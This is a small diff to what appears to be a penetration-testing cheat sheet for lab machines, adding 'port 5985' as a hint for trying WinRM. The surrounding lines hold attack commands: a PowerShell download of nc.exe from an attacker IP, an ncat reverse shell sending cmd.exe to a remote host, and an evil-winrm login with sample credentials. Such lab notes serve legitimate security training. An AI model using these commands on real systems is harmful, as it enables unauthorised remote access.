@@ -268,7 +268,7 @@ Password Protected SSH Private Key:
 					- or powershell wget http://10.10.16.18/nc.exe -outfile nc.exe
 				- .\ncat.exe -e cmd.exe 10.10.14.49 4433
 	- winrm
-		- if you see a winrm service and you have credentials
+		- if you see a winrm service and you have credentials or if you see port 5985
 			- sudo gem install evil-winrm 
 			- evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161 
 	- impacket
